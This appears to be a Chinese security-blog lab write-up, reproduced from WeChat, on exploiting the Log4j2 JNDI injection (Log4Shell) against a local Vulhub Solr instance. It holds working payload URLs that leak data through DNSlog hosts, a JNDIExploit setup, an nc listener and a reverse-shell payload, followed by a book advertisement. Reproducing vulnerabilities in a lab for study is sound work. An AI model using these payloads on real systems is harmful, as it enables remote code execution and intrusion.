<meta name="referrer" content="no-referrer"/>
> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/2COe2VwHuHDywwqtekkWQQ)

![](https://mmbiz.qpic.cn/mmbiz_png/xaUfm8URXuekQBS93GdYryjIs9TQd3nibGJKRMrXH0e4CQuBMfxA59GZxInpTtDqgHO3KOWqxlRicHP3vkyXYhTA/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/xaUfm8URXuekQBS93GdYryjIs9TQd3nib3BuM4gjCmNOcVN2DtVOYshl9shmNLaoLVL8BuYsDoaTrIicJVOktnibA/640?wx_fmt=png)

点击上方蓝字关注我们

![](https://mmbiz.qpic.cn/mmbiz_png/al1OxRUwibUXtWs1ibqvwNlJ0FKeAOQLgg4Niaibib0k08p4Ww4VI9rBI8taicaDXXFEv7ibNMKJBvqAGW5JJkTTauNJQ/640?wx_fmt=png)

✎ 阅读须知

  

乌鸦安全的技术文章仅供参考，此文所提供的信息只为网络安全人员对自己所负责的网站、服务器等（包括但不限于）进行检测或维护参考，未经授权请勿利用文章中的技术资料对任何计算机系统进行入侵操作。利用此文所提供的信息而造成的直接或间接后果和损失，均由使用者本人负责。

乌鸦安全拥有对此文章的修改、删除和解释权限，如转载或传播此文章，需保证文章的完整性，未经授权，不得用于其他。

本文所提供的工具仅用于学习，禁止用于其他，请在 24 小时内删除工具文件！！！

01

**漏洞描述**

  

Apache Log4j 2 是 Java 语言的日志处理套件，使用极为广泛。在其 2.0 到 2.14.1 版本中存在一处 JNDI 注入漏洞，攻击者在可以控制日志内容的情况下，通过传入类似于 ${jndi:ldap://evil.com/example} 的 lookup 用于进行 JNDI 注入，执行任意代码。

参考地址：  

```
https://github.com/vulhub/vulhub
```

本次漏洞复现也是基于 Vulhub

![](https://mmbiz.qpic.cn/mmbiz_gif/HficxWTTwt1Ctic0nBTofOAVNukhTeZlsqrvF18qrnKVmNe2NLDxsUSVvFENibDNSfo2L0Bnu6N0IvD7eNngicNdicg/640?wx_fmt=gif)

02

**漏洞环境搭建**

  

```
docker-compose up -d --build
```

![](https://mmbiz.qpic.cn/mmbiz_png/HficxWTTwt1CibpqtXSO3TJnuOd18qXfIotvgfCU4Mkhnf881DELWjHBHlemrg6mj4iczlcGupsibPzlfC48Cx4GGA/640?wx_fmt=png)

访问`http://127.0.0.1:8983/solr/#/`

![](https://mmbiz.qpic.cn/mmbiz_png/HficxWTTwt1CibpqtXSO3TJnuOd18qXfIotCp5MaxTUhwHXcsqt94GgVs2pG0NNu3gxwB8xWHHKIkZkFDEn4vjTg/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_gif/HficxWTTwt1Ctic0nBTofOAVNukhTeZlsqrvF18qrnKVmNe2NLDxsUSVvFENibDNSfo2L0Bnu6N0IvD7eNngicNdicg/640?wx_fmt=gif)

03

**Dnslog 测试**

  

在 DNSlog 平台请求一个 dns 域名：`3j7r1s.dnslog.cn`

![](https://mmbiz.qpic.cn/mmbiz_png/HficxWTTwt1CibpqtXSO3TJnuOd18qXfIoeQiapvYk5C8TdpnTMck1fuDswsKnc9NyY9LoBia3ppXRxOHh4wrBZJPQ/640?wx_fmt=png)

构造：

${jndi:dns://${sys:java.version}.example.com} 是利用 JNDI 发送 DNS 请求的 Payload：

```
http://127.0.0.1:8983/solr/admin/cores?action=${jndi:ldap://${sys:java.version}.3a5h27.dnslog.cn}
```

直接访问：

```
http://127.0.0.1:8983/solr/admin/cores?action=${jndi:ldap://${sys:java.version}.3j7r1s.dnslog.cn}
```

![](https://mmbiz.qpic.cn/mmbiz_png/HficxWTTwt1CibpqtXSO3TJnuOd18qXfIoLmpPb9LwMFvUhQVc2QFm8mIbk4WOuKMnDqf0z5tIV4jSDva3CXJevw/640?wx_fmt=png)

此时直接得到版本信息：`1.8.0`

![](https://mmbiz.qpic.cn/mmbiz_png/HficxWTTwt1CibpqtXSO3TJnuOd18qXfIoAeibNK7adEiaD7lDRbweCkOLuaia16hPUia0gicfoKGia47fELSQK92jrHXg/640?wx_fmt=png)

或者是请求：  

```
http://127.0.0.1:8983/solr/admin/cores?action=${jndi:ldap://cd9097fd.dns.1433.eu.org}
```

![](https://mmbiz.qpic.cn/mmbiz_png/HficxWTTwt1CibpqtXSO3TJnuOd18qXfIojaLmM4gribEp6HeWJTHXHwQh5oTrNmPXaE1cmyhGNewu8wrGh4H90QA/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_gif/HficxWTTwt1Ctic0nBTofOAVNukhTeZlsqrvF18qrnKVmNe2NLDxsUSVvFENibDNSfo2L0Bnu6N0IvD7eNngicNdicg/640?wx_fmt=gif)

04

**反弹 shell**

  

反弹 shell 需要使用 JNDIExploit.v1.2，可以从下面百度云直接下载：

详细的信息可以参考[上一篇文章](http://mp.weixin.qq.com/s?__biz=MzI3NjA4MjMyMw==&mid=2647778614&idx=1&sn=195e9bc45afaa614bed50035d8a7466d&chksm=f35fbecac42837dcc24779cdc6123afeade569d5f7c872b08d1f19623ee7d6351d22bdc504bd&scene=21#wechat_redirect)

```
https://pan.baidu.com/s/1lxXt-27-i7I_dOUACphVtQ 提取码: nkc5
```

![](https://mmbiz.qpic.cn/mmbiz_png/HficxWTTwt1CibpqtXSO3TJnuOd18qXfIoicwsDWvCEdKLUw3hwficGlumvaU2oMz2dbuV5gyAbyia0100Y3tj4DzRg/640?wx_fmt=png)

网络拓扑：

![](https://mmbiz.qpic.cn/mmbiz_png/HficxWTTwt1CibpqtXSO3TJnuOd18qXfIonLZwZibSJZELCYXpYwtbSSRYjsxByULHWoExcoOicaKcaWRErK6deUpQ/640?wx_fmt=png)

攻击机：`10.211.55.23`  

靶机：`10.211.55.2`

中转机：`10.211.55.3` 

中转机 java 版本：`1.8.0_172`

首先在中转机上使用`JNDIExploit-1.2-SNAPSHOT.jar`文件使用 java 启动，命令如下：

```
java -jar JNDIExploit-1.2-SNAPSHOT.jar -i 10.211.55.3
```

  其中：`10.211.55.3`为中转机的 ip 地址

![](https://mmbiz.qpic.cn/mmbiz_png/HficxWTTwt1CibpqtXSO3TJnuOd18qXfIomDMbhk5Qic7P5icgWxSSX3nS8pbEzib1DFU7F4YwBgTgu1Bs2eeTs12TQ/640?wx_fmt=png)

然后在攻击机上开启监听：`nc -lvvp 6666`

![](https://mmbiz.qpic.cn/mmbiz_png/HficxWTTwt1CibpqtXSO3TJnuOd18qXfIoAj1Kca1vVYa0uuF4GVcntkib026mIxLmnFSNu2vT1ODkukHMxa8Tnrg/640?wx_fmt=png)

此时构造如下命令：

```
http://127.0.0.1:8983/solr/admin/cores?action=${jndi:ldap://10.211.55.3:1389/Basic/ReverseShell/10.211.55.23/6666}
```

其中：

*   `http://127.0.0.1:8983`为靶机的地址
    
*   `10.211.55.3`为中转机地址
    

*   `10.211.55.23`为 Kali 攻击机 ip 地址，此时要反弹 shell
    

更多用法可以参考：

```
https://github.com/zzwlpx/JNDIExploit
```

直接执行之后，shell 就弹回来了

![](https://mmbiz.qpic.cn/mmbiz_png/HficxWTTwt1CibpqtXSO3TJnuOd18qXfIo4gKyyEGcM23I4icKmicSxoXR2XNb5EUR875JQvw0kbQYibJvYOVWQNs2g/640?wx_fmt=png)

此时在中转机器上：

![](https://mmbiz.qpic.cn/mmbiz_png/HficxWTTwt1CibpqtXSO3TJnuOd18qXfIozhYpdTCHxxC4DAqwMZyO3dsBOPQDfg7lApQRN2sOzfN5qpj6H9hHHw/640?wx_fmt=png)

成功！

清除环境：`docker-compose down`

![](https://mmbiz.qpic.cn/mmbiz_png/HficxWTTwt1CibpqtXSO3TJnuOd18qXfIoeicMvPDVibuv5f5O7iaL7b4IPooMHzh0439wn512wA5AO8OXeYLwKeWkg/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_gif/HficxWTTwt1Ctic0nBTofOAVNukhTeZlsqrvF18qrnKVmNe2NLDxsUSVvFENibDNSfo2L0Bnu6N0IvD7eNngicNdicg/640?wx_fmt=gif)

05

 **注 意 事 项**

  

中转机的 java 版本：`1.8.0_172`

![](https://mmbiz.qpic.cn/mmbiz_png/HficxWTTwt1CibpqtXSO3TJnuOd18qXfIoL3qrKOgMZ5QVrDqC7vHzicmM34R5qibILiaib4ibNbLEWT7Icu2zwNDK9dw/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/7PuqRWWU6zPRMxSeBfjvKhbuTlWQcqk8L2ib8dROI0fFTknJfEctspUxmbxZwkvG9214pibCEmGWsuEDvDad20tA/640?wx_fmt=png)  

新书推荐

![](https://mmbiz.qpic.cn/mmbiz_png/US10Gcd0tQGCeAxCpwiafHPCQ59GvHz6giandwhxYRRbpy9Fg4r24n3DUppDIuN9AdtiaAYaIEm15OGhIfuv6Mzkg/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_gif/TN05MmJLxMrNiboff6rhmPUYUNXdWTXZfiaHXPuUGqmPZtqhI6NtGicPMIu6ohOCReWY2C4YZY4AIchDMyal6KWQw/640?wx_fmt=gif)

Java 是编程世界备受欢迎的语言，虽然 Java 技术在运用中已趋成熟，但招聘市场的 Java 开发人才却仍然供不应求。《Java 核心技术及面试指南》一书，从 Java 核心技术的开发和面试指南的解析两个方面展开，包括基本语法中常用技术点的精讲、集合类与常用的数据结构分析、异常处理与 IO 操作、多线程与并发编程、虚拟机内存优化技巧等内容，同时教会读者如何通过简历和面试找到好工作。本书既适合在公司中从事 Java 编程和开发工作的人员学习，也适合作为大中专职业院校毕业生的学习用书，特别有助于想要加强专业技术提高工作效率、通过简历和面试找到好工作的人群。

![](https://mmbiz.qpic.cn/mmbiz_jpg/HficxWTTwt1Dia9yexYpfywdibpdot38A258ibuiaZGr2ZqJTcHNYXg21fCnCREGg8iaNGkE17ZVVicN4XIFib2A33J9IQ/640?wx_fmt=jpeg)

  

广告

Java 核心技术及面试指南
--------------

作者：金华，胡书敏，周国华，吴倍敏

**当当**   购买

  

点击上方链接，更多优惠等你哦~

tips：加我 wx，拉你入群，一起学习

![](https://mmbiz.qpic.cn/mmbiz_jpg/HficxWTTwt1ACBHDE9o8KA6icOCZVKdLBJOca699BJK50FDxBNnhRZrS1hyXb2K4AkLTYfJwticmyHQxv3X6vZHfQ/640?wx_fmt=jpeg)

![](https://mmbiz.qpic.cn/mmbiz_png/CibE0jlnugbX5SLGI9312kOrkH7gXIN5NPic75bQ8WbAFMEqvZiaQ0WSk4W9eYUfJJRzlMgibjic8mIGicMvjialoDgmQ/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_jpg/HficxWTTwt1ACBHDE9o8KA6icOCZVKdLBJkslQQ2B5nDuKBlpbKHHtME5RBrJsYucDbPWpyglY02yicRq93PTWn7w/640?wx_fmt=jpeg)

扫取二维码获取

更多精彩

乌鸦安全

![](https://mmbiz.qpic.cn/mmbiz_gif/HficxWTTwt1Bt3mgRlo88wGCQuAJ2kv0pzM18jFmpv4CJEBMNAicGSSvDlWSN6DG5JJ0Q8EI6oEuaZS0QNyAojYw/640?wx_fmt=gif)